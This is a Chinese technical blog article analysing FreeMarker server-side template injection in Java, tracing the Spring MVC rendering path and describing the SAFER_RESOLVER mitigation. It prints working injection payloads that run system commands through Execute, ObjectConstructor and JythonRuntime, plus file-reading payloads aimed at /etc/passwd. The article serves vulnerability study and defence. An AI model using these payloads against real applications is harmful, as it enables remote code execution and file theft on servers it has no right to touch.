#  Java FreeMarker 模板引擎注入深入分析  
 蚁景网安   2025-06-09 08:59  
  
温馨提示：图片有点多，请耐心阅读哦  
## 0x01 前言  
  
最近和   
F1or  
 大师傅一起挖洞的时候发现一处某 CMS SSTI 的 0day，之前自己在复现 jpress 的一些漏洞的时候也发现了 SSTI 这个洞杀伤力之大。今天来好好系统学习一手。  
- • 有三个最重要的模板，其实模板引擎本质上的原理差不多，因为在 SpringBoot 初学习的阶段我就已经学习过 Thymeleaf 了，所以大体上老生常谈的东西就不继续讲了。  
  
三个模板的模板注入攻击差距其实还是有点大的，而且 Java 的 SSTI 和 Python Flask 的一些 SSTI 差距有点大。我们今天主要来看看 FreeMarker 的 SSTI  
## 0x02 FreeMarker SSTI  
  
FreeMarker 官网：http://freemarker.foofun.cn/index.html  
  
对应版本是 2.3.23，一会儿我们搭建环境的时候也用这个版本  
### FreeMarker 基础语法  
  
关于文本与注释，本文不再强调，重点看插值与 FTL 指令。  
#### 插值  
- • 插值也叫 Interpolation，即 ${..}  
 或者 #{..}  
 格式的部分，将使用数据模型中的部分替代输出  
  
比如这一个 .ftl 文件  
```
<!DOCTYPE html>  <html lang="en"><head><meta charset="UTF-8"><title>Hello ${name}!</title><link href="/css/main.css" rel="stylesheet"></head><body><h2 class="hello-title">Hello ${name}!</h2><script src="/js/main.js"></script></body></html>
```  
- • 那么 ${name}  
 的数据就会从传参里面拿，对应的这个是在 addAttribute  
 中的 name 参数  
  
#### FTL 指令  
  
FTL 指令以 #  
 开头，其他语法和 HTML 大致相同。  
> 我这里其实也花了不少时间看了 FreeMarker 的基础语法，但是并非很透彻，就不误人子弟了，有兴趣的师傅可以自己前往 FreeMarker 手册查看。  
  
  
https://freemarker.apache.org/  
### FreeMarker SSTI 成因与攻击面  
  
看了一些文章，有些地方有所疏漏，先说 SSTI 的攻击面吧，我们都知道 SSTI 的攻击面其实是模板引擎的渲染，所以我们要让 Web 服务器将 HTML 语句渲染为模板引擎，前提是要先有 HTML 语句。那么 HTML 如何才能被弄上去呢？这就有关乎我们的攻击面了。  
- • 将 HTML 语句放到服务器上有两种方法：  
  
- • 1、文件上传 HTML 文件。  
  
- • 2、若某 CMS 自带有模板编辑功能，这种情况非常多。  
  
因为之前有接触过 Thymeleaf 的 SSTI，Thymeleaf 的 SSTI 非常锋利， Thymeleaf SSTI 的攻击往往都是通过传参即可造成 RCE（当然这段话很可能是不严谨的  
  
在刚接触 FreeMarker 的 SSTI 的时候，我误以为它和 Thyemelaf 一样，直接通过传参就可以打，后来发现我的想法是大错特错。  
#### 环境搭建  
- • 一些开发的基本功，因篇幅限制，我也不喜放这些代码的书写，贴个项目地址吧  
  
https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/CodeReview  
#### 漏洞复现  
  
前文我有提到，FreeMarker 的 SSTI 必须得是获取到 HTML，再把它转换成模板，从而引发漏洞，所以这里要复现，只能把 HTML 语句插入到 .ftl 里面，太生硬了简直。。。。。不过和 F1or 师傅一起挖出来的 0day 则是比较灵活，有兴趣的师傅可以滴一下我  
  
payload：  
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs24ktSHlq4wias5ib4aRMNwetcRicdMqrIDo3Hdlh0aVQ3xrOyic14XTsdeA/640?wx_fmt=png "null")  
  
构造出这个 PoC 的原因是 freemarker.template.utility.Execute  
 类里面存在如下图所示的命令执行方法，都写到脸上来了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2UtUeJMHqJuUztPQ1Y2MuS7dD0f3lMBRvMom63Q77rbkic5OboMq0XLA/640?wx_fmt=png "null")  
  
漏洞复现如图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2ZZqhhDVKU9buwic97eic6bjX7siccOibeI4wVunWzsDlnFFEr9VfIIerQA/640?wx_fmt=png "null")  
#### 漏洞分析  
  
我们要分析的是，MVC 的思维，以及如何走到这个危险类 ———— freemarker.template.utility.Execute  
 去的。  
  
下一个断点在 org.springframework.web.servlet.view.UrlBasedViewResolver#createView  
，开始调试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2icKuqAfRmQ0Vpg9ZicNRuXVQsZaXR4xmSr96O7WO4Zb5fFYgSUBW6KcQ/640?wx_fmt=png "null")  
  
跟进 super.createView()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2QkzSZJxE3yy6Qhkmo0yAiapGJaiczoyckOTEqKRggPynaX2Znl5YuF5Q/640?wx_fmt=png "null")  
  
进一步跟进 loadView()  
 以及 buildView()  
，这些方法的业务意义都比较好理解，先 create 一个 View 视图，再将其 load 进来，最后再 build。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2T5R0bUuZsib8PKmhBmQS2wXZwCOu21nXpXzkvfChjJibarx5Pe4pNmnw/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs26FaH4FoqCRRpksB1jk1ybIUcics7vpORwCicG2o7al9aibXuXzYPNUbfw/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2Rj2JXOn9nCFP4bwNMg0Yh13I9T9xUbSTQTfUCvLBDQicJSkdCZyutZg/640?wx_fmt=png "null")  
  
在 buildView()  
 方法当中，先通过 this.instantiateView()  
 的方式 new 了一个 FreeMarkerView  
 类，又进行了一些基础赋值，将我们的 View Build 了出来（也就是 View 变得有模有样了）  
  
继续往下走，回到 loadView()  
 方法，loadView()  
 方法调用了 view.checkResource()  
 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2LJelcwzpUPWYMLDQyopO3sDp5nNhiaXynBOgmhruukwKplohlz7YiazQ/640?wx_fmt=png "null")  
  
checkResource()  
 方法做了两件事，第一件事是判断 Resource  
 当中的 url 是否为空，也就是判断是否存在 resource，如果 url 都没东西，那么后续的模板引擎加载就更不用说了；第二件事是进行 template  
 的获取，也可以把这理解为准备开始做模板引擎加载的业务了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2QGicQlqO1JVE7h3pwiaPYBuBjCZPGUhg1BZQA9UjVmJtGAIlbKer5aew/640?wx_fmt=png "null")  
  
跟进 getTemplate()  
 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs27Yuydc5R9ibbFsUWj8tdAcPU0Mep8iaKoHM0MBb4hicFNQC4Bn5BG7dnA/640?wx_fmt=png "null")  
  
首先做了一些赋值判断，再判断 Template 的存在，我们跟进 this.cache.getTemplate  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2fQLtYe7jbm1HFiaK0FEAwDFBWbH4MeAVZANUbmcOibSyJTV2EFherWpg/640?wx_fmt=png "null")  
  
这里从 cache 里面取值，而在我们 putTemplate  
 设置模板的时候，也会将至存储到 cache中。  
  
跟进 getTemplateInternal()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2fPsI2wlVJJJbtJybkRd5PfjT3mo3YYPSww9s1790ofTMsQs4SQXuKg/640?wx_fmt=png "null")  
  
先做了一些基本的判断，到 202 行，跟进 lookupTemplate()  
 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2nPPTYsQwYmq2bWXPs9hCMPvSOjVv2ZhkSonufAU6x3LVnN51HUJqDw/640?wx_fmt=png "null")  
  
这里代码很冗杂，最后的结果是跟进 `freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2rG5wQqFE0Xz4nU7fcfQT7QgpyIh5aFARe4jysAl8UhNYicosDcUZVicA/640?wx_fmt=png "null")  
  
代码会先拼接 _zh_CN  
，再寻找未拼接 _zh_CN  
 的模板名，调用 this.findTemplateSource(path)  
 获取模板实例。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2XPcrh0R1ogMM2O3iaScic3oHD23vmoT53xrQRfg92IiaiczrGCuytud4wA/640?wx_fmt=png "null")  
  
这里就获取到了 handle 执行返回的模板视图实例，这里我 IDEA 没有走过去，就跟着奶思师傅的文章先分析了。  
  
org.springframework.web.servlet.DispatcherServlet#doDispatch  
 流程  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2h7LCmP8ka4WK2vkNew0hmXh5p3GQeibe54F8jVWzVtVRGWa5GibVExmQ/640?wx_fmt=png "null")  
  
handle 执行完成后调用 this.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);  
 进行模板解析。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2RezFzhFBiae5NwLa0TLt54jlanRUEvibKSxK07zQvTNiaUpgNUWYLehUg/640?wx_fmt=png "null")  
  
调用 view.render(mv.getModelInternal(), request, response);  
 一路跟进至 org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2XngSr0DBYtt8mdpLvZACzt2BBvawsmJvOGkTZf2YtYVGlGRaBHmOUw/640?wx_fmt=png "null")  
  
跟进 this.processTemplate()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2Nmdb8VWuTc3Np3wj5Bg6XvkNI42PszM5KLHZT5NFs4ysL8AtmP1ldA/640?wx_fmt=png "null")  
  
跟进 process()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs21cHvwIYDeBEAWHWbgneJUEjYgpWHICrmHiaecCOjOia0osFEdZ83ssQA/640?wx_fmt=png "null")  
- • process()  
 方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。  
  
在 process()  
 方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2n3sDY0guMyia2IjDOuvCK7GI43tuLd56QADjQ0Jsw0ZpbSDdTIJyGyQ/640?wx_fmt=png "null")  
> 在读取到每一条 freeMarker 表达式语句的时候，会二次调用 visit()  
 方法，而 visit()  
 方法又调用了 element.accept()  
，跟进  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2cyXv6ohSF5cAxtEnuMFacNo1aRDKbPYjhURTlGUm8rhnCFPibT8Mic6g/640?wx_fmt=png "null")  
  
跟进 calculateInterpolatedStringOrMarkup()  
 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2Xqfn19WuncXgEfZ65H5ePAibWuyrKFBrmHmqyfAmic9Okyyv5uLnibFBQ/640?wx_fmt=png "null")  
  
calculateInterpolatedStringOrMarkup()  
 方法做的业务是将模型强制为字符串或标记，跟进 eval()  
 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2Au5MGBYVgwvibNUVPOVmqrI7aG9Q8bnMqnV3IRYBQRt7tZzWwTyQEiaA/640?wx_fmt=png "null")  
  
eval()  
 方法简单判断了 constantValue  
 是否为 null，这里 constantValue  
 为 null，跟进 this._eval()  
，一般的 _eval()  
 方法只是将 evn 获取一下，但是对于 ftl 语句就不是这样了，一般的 _eval()  
 方法如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2nJHtQyzkxFtoroNIFUiaFBRJhZcb44Mux5U0mGABovM3GFCGoZELTlw/640?wx_fmt=png "null")  
  
而对于 ftl 表达式来说，accept  
 方法是这样的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2rKBhbxwa0K4iciaexTbltC144Dnzj7So3G5depHMebfjnr9gcQZhmFgw/640?wx_fmt=png "null")  
  
跟进一下 accept()  
 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs282PxTzgx82dCnAzKaUkH6dbPHtDnHZTjNqONI81oFUJAZ5d4ydJ2RA/640?wx_fmt=png "null")  
  
做了一系列基础判断，先判断 namespaceExp  
 是否为 null，接着又判断 this.operatorType   
 是否等于 65536，到第 105 行，跟进 eval()  
 方法，再跟进 _eval()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2fQIia5MCF96IC7ibiaOZronqJnicibTvk1uunzZQ6ujcULicXsqDAZmw6NYQ/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs28sj3XE7QXh39JMRJ4BpVB7WpXoF9WUJpXonCyicuctTa6iaBKaShUBHg/640?wx_fmt=png "null")  
  
我们可以看到 targetMethod  
 目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类，也就是说这一个语句相当于  
```
Object result = targetMethod.exec(argumentStrings);// 等价于Object result = freemarker.template.utility.Execute.exec(argumentStrings);
```  
  
而这一步并非直接进行命令执行，而是先把这个类通过 newInstance()  
 的方式进行初始化。  
  
命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2oTujVcUicibI74LBT3ypwIsSIOialFYtp2uDm1uRib8wLf7xs8qMbm6SBQ/640?wx_fmt=png "null")  
  
至此，分析结束，很有意思的一个流程分析。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2ygTO4v3oqlpLAEeLia8oI59UUhx7ffvekiaY7EoQKPiciajibRIJBwXKBbw/640?wx_fmt=png "null")  
### FreeMarker SSTI 的攻防二象性  
  
我们目前的 PoC 是这么打的  
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}
```  
  
这是因为 FreeMarker 的内置函数 new 导致的，下面我们简单介绍一下 FreeMarker的两个内置函数—— new  
 和 api  
#### 内置函数 new  
  
可创建任意实现了 TemplateModel  
 接口的 Java 对象，同时还可以触发没有实现 TemplateModel  
 接口的类的静态初始化块。  
  
以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 TemplateModel  
 接口的 freemarker.template.utility.JythonRuntime  
 和freemarker.template.utility.Execute  
#### API  
  
value?api  
 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod()  
 或 value?api.someBeanProperty  
。可通过 getClassLoader  
获取类加载器从而加载恶意类，或者也可以通过 getResource  
来实现任意文件读取。  
  
但是，当api_builtin_enabled  
为 true 时才可使用 api 函数，而该配置在 **2.3.22 版本**  
之后默认为 false。  
- • 由此我们可以构造出一系列的 bypass PoC  
  
POC1  
```
<#assign classLoader=object?api.class.protectionDomain.classLoader> <#assign clazz=classLoader.loadClass("ClassExposingGSON")> <#assign field=clazz?api.getField("GSON")> <#assign gson=field?api.get(null)> <#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> ${ex("Calc"")}
```  
  
POC2  
```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","Calc").start()}
```  
  
POC3  
```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc")
```  
  
POC4  
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("Calc") }
```  
  
读取文件  
```
<#assign is=object?api.class.getResourceAsStream("/Test.class")>FILE:[<#list 0..999999999 as _>    <#assign byte=is.read()>    <#if byte == -1>        <#break>    </#if>${byte}, </#list>]
```  
```
<#assign uri=object?api.class.getResource("/").toURI()><#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()><#assign is=input?api.getInputStream()>FILE:[<#list 0..999999999 as _><#assign byte=is.read()><#ifbyte==-1><#break></#if>${byte},</#list>]
```  
  
从 **2.3.17**  
版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：  
  
1、UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className)  
 获取任何类。  
  
2、SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime  
、freemarker.template.utility.Execute  
、freemarker.template.utility.ObjectConstructor  
这三个类。  
  
3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。  
  
可通过freemarker.core.Configurable#setNewBuiltinClassResolver  
方法设置TemplateClassResolver  
，从而限制通过new()  
函数对freemarker.template.utility.JythonRuntime  
、freemarker.template.utility.Execute  
、freemarker.template.utility.ObjectConstructor  
这三个类的解析。  
#### FreeMarker SSTI 修复  
> 因为 FreeMarker 不能直接传参打，所以此处的代码参考奶思师傅。  
  
```
package freemarker;import freemarker.cache.StringTemplateLoader;import freemarker.core.TemplateClassResolver;import freemarker.template.Configuration;import freemarker.template.Template;import java.io.IOException;import java.io.OutputStreamWriter;import java.io.StringWriter;import java.util.HashMap;publicclassfreemarker_ssti{publicstaticvoidmain(String[] args)throwsException{//设置模板HashMap<String,String> map =newHashMap<String,String>();Stringpoc="<#assign aaa=\"freemarker.template.utility.Execute\"?new()> ${ aaa(\"open -a Calculator.app\") }";System.out.println(poc);StringTemplateLoaderstringLoader=newStringTemplateLoader();Configurationcfg=newConfiguration();        stringLoader.putTemplate("name",poc);        cfg.setTemplateLoader(stringLoader);//cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);//处理解析模板TemplateTemplate_name= cfg.getTemplate("name");StringWriterstringWriter=newStringWriter();Template_name.process(Template_name,stringWriter);}}
```  
  
防御成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBwMMmTLOl045npgLicDzs2KY6QyKBibLccu48fbs3l5mh2fe3Euo3nPaicxSTrX55NlPcj4Zk1Qc5A/640?wx_fmt=png "null")  
## 0x03 小结  
  
比较其他两个模板引擎来说，FreeMarker 的 SSTI 更为严格一些，它的防护也做的相当有力，这个给自己挖个小坑吧，后续去看一看 FreeMarker 的代码当中是否存在强而有力的 bypass payload 。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学习  
网安实战技能课程  
，戳  
“阅读原文“  
  
